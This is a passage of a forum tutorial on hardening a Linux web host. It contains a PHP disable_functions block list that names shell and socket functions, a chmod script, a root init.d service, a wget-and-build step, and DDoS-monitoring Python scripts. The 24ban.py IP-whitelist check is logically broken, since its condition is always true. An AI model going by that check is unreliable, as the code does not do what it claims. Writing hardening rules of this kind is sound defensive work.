#0000BB">pcntl_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_connect</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_bucket_prepend</span><span style="color: #007700">,</span><span style="color: #0000BB">chown</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_strerror</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_multi_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_fork</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_child_terminate&nbsp;<br /></span>
</span>
</code></code></div>
</div>and beginners can check <a href="http://www.madirish.net/199" target="_blank">HERE </a>for help and learn how to do these things.<br />
<br />
All I said was simple and there were not any special things and maybe easy to bypass, but do NOT hurry. Let me explain more and then we shall be to continue. By that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, so copy this python script in your public_html folder and run it. It will change file and folder permissions [remove write permission]. After you setup your website and finish, you must close “write permission” on every folder and files in public_html. On this way anyone can’t upload anything on your website and if you want to upload anything, you have to upload on database, or if you want to upload in the public_html folder you must open permission for the second time and upload your files and close it again, Now We know that uploading and file writing begin to disable on our server in a simple way.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:204px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">import&nbsp;os<br /></span><span style="color: #FF8000">#perm.py<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/perm.py<br />#Ali&nbsp;Razmjoo<br /></span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">dirnames</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filenames&nbsp;in&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">walk</span><span style="color: #007700">(</span><span style="color: #DD0000">'/home/zeroday/public_html/'</span><span style="color: #007700">):&nbsp;</span><span style="color: #FF8000">#change&nbsp;directory&nbsp;or&nbsp;copy&nbsp;file&nbsp;to&nbsp;public_html&nbsp;directory&nbsp;and&nbsp;set&nbsp;directory&nbsp;('.')<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">subdirname&nbsp;in&nbsp;dirnames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">subdirname</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">2</span><span style="color: #007700">:&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'chmod&nbsp;555&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">f</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#555&nbsp;Perm&nbsp;for&nbsp;Folders<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">filename&nbsp;in&nbsp;filenames</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">path</span><span style="color: #007700">.</span><span style="color: #0000BB">join</span><span style="color: #007700">(</span><span style="color: #0000BB">dirname</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">filename</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">f</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">2</span><span style="color: #007700">:&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'chmod&nbsp;444&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">f</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#444&nbsp;Perm&nbsp;for&nbsp;Files<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: This script set 555 permission for folders and 444 for files.<br />
Note: All scripts are not coded in professional coding mode so take it easy. I wrote them so fast.<br />
<br />
Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?<br />
<br />
1- Check for DOS/DDOS attack from inside and outside<br />
2- Check MD5 for public_html files<br />
<br />
And now about source codes and explain. At first you must create file with name “zeroday” in /etc/init.d/ zeroday is the beginning of your service name. [work with command “service zeroday start/stop”] and here is sourcode code.<br />
<br />
Note: You can choose a different service name [‘zeroday’ or anything you like].<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/bin/bash<br />#found&nbsp;on&nbsp;google<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday<br />#zeroday<br /></span><span style="color: #0000BB">WORK_DIR</span><span style="color: #007700">=</span><span style="color: #DD0000">"/var/lib/foo"<br /></span><span style="color: #0000BB">DAEMON</span><span style="color: #007700">=</span><span style="color: #DD0000">"/usr/bin/python"<br /></span><span style="color: #0000BB">ARGS</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/zeroday.py"<br /></span><span style="color: #0000BB">PIDFILE</span><span style="color: #007700">=</span><span style="color: #DD0000">"/var/run/foo.pid"<br /></span><span style="color: #0000BB">USER</span><span style="color: #007700">=</span><span style="color: #DD0000">"root"&nbsp;</span><span style="color: #FF8000">#you&nbsp;must&nbsp;run&nbsp;this&nbsp;process&nbsp;as&nbsp;root<br /></span><span style="color: #0000BB">KILL</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/kill.py"<br /></span><span style="color: #007700">case&nbsp;</span><span style="color: #DD0000">"$1"&nbsp;</span><span style="color: #0000BB">in<br />&nbsp;&nbsp;start</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Starting&nbsp;server"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mkdir&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">p&nbsp;</span><span style="color: #DD0000">"</span><span style="color: #0000BB">$WORK_DIR</span><span style="color: #DD0000">"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">start&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">pidfile&nbsp;$PIDFILE&nbsp;</span><span style="color: #007700">\&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">user&nbsp;$USER&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-</span><span style="color: #0000BB">b&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">make</span><span style="color: #007700">-</span><span style="color: #0000BB">pidfile&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">chuid&nbsp;$USER&nbsp;</span><span style="color: #007700">\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--</span><span style="color: #0000BB">exec&nbsp;$DAEMON&nbsp;$ARGS<br />&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Stopping&nbsp;server"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">stop&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">pidfile&nbsp;$PIDFILE&nbsp;</span><span style="color: #007700">--</span><span style="color: #0000BB">verbose<br />&nbsp;&nbsp;python&nbsp;$KILL<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br />&nbsp;&nbsp;*)<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Usage:&nbsp;/etc/init.d/</span><span style="color: #0000BB">$USER</span><span style="color: #DD0000">&nbsp;{start|stop}"<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">exit&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">;;<br /></span><span style="color: #0000BB">esac<br /></span><span style="color: #007700">exit&nbsp;</span><span style="color: #0000BB">0&nbsp;<br /></span>
</span>
</code></code></div>
</div>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?<br />
<br />
1- Check for DOS/DDOS attack from inside and outside<br />
2- Check MD5 for public_html files<br />
<br />
And now about source codes and explain. At first you must create file with name “zeroday” in /etc/init.d/ zeroday is the beginning of your service name. [work with command “service zeroday start/stop”] and here is sourcode code.<br />
Note: You can choose a different service name [‘zeroday’ or anything you like].<br />
<br />
Explain this code:<br />
I found this code in google and it’s gonna help us make a service very easy on linux. Look at this like: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">ARGS</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/zeroday.py"&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>zeroday.py is main starting script of robot.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">KILL</span><span style="color: #007700">=</span><span style="color: #DD0000">"/root/kill.py"&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>kill.py execute when we want stop robot[service].<br />
<br />
Note: You must create these files in same directory or change directory in service bash script.<br />
Note: As you see in line 12 , we must install ‘start-stop-daemon’ so download and install it.<br />
<br />
Download Daemon tools: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">wget&nbsp;https</span><span style="color: #007700">:</span><span style="color: #FF8000">//raw.githubusercontent.com/Ali-Razmjoo/z3r0d4y/master/daemon.zip<br /></span><span style="color: #0000BB">unzip&nbsp;daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />cd&nbsp;daemon<br />make&nbsp;<br /></span>
</span>
</code></code></div>
</div>And if you get any error, or you don’t have gcc:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;gcc<br />gcc&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">c&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">o&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />cp&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;<br /></span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:288px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#zeroday.py<br />#!/usr/bin/python<br />#Ali&nbsp;Razmjoo&nbsp;<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">def&nbsp;stop</span><span style="color: #007700">(</span><span style="color: #0000BB">signum</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">frame</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">set</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">signal</span><span style="color: #007700">(</span><span style="color: #0000BB">signal</span><span style="color: #007700">.</span><span style="color: #0000BB">SIGTERM</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">stop</span><span style="color: #007700">)<br />if&nbsp;</span><span style="color: #0000BB">__name__&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #DD0000">'__main__'</span><span style="color: #007700">:&nbsp;</span><span style="color: #FF8000">#start&nbsp;software<br />&nbsp;&nbsp;</span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">not&nbsp;stop_event</span><span style="color: #007700">.</span><span style="color: #0000BB">is_set</span><span style="color: #007700">():&nbsp;</span><span style="color: #FF8000">#while&nbsp;bash&nbsp;script&nbsp;not&nbsp;stop&nbsp;....<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_in&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/in.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_in&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_in</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_out&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/out.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_out&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_out</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_24&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/24ban.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_24&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_24</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">subpro_md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(&#91;</span><span style="color: #DD0000">'python'</span><span style="color: #007700">,</span><span style="color: #DD0000">'/root/md5.py'</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid_md5&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">subpro_md5</span><span style="color: #007700">.</span><span style="color: #0000BB">pid</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">loop&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#keep&nbsp;this&nbsp;process&nbsp;active<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">1000</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Note: Copy this script in /root/ directory, If you want change directory, Don’t forget to change it in source codes too.<br />
And other files you need to have in root directory:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python<br />#24ban.py<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/24ban.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()<br />while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">120</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'netstat&nbsp;-ntu&nbsp;|&nbsp;awk&nbsp;\'{print&nbsp;$5}\'&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-n&nbsp;&gt;&gt;&nbsp;/root/IPz.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/IPz.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;file</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word_num&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;words&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ip</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">text_word&nbsp;in&nbsp;words</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">word_num&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">text_word</span><span style="color: #007700">)&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">20</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;2</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">Ban&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'.'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'127.0.0.1'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'176.9.183.142'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'79.175.163.84'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:&nbsp;&nbsp;</span><span style="color: #FF8000">#replace&nbsp;your&nbsp;ip&nbsp;address<br 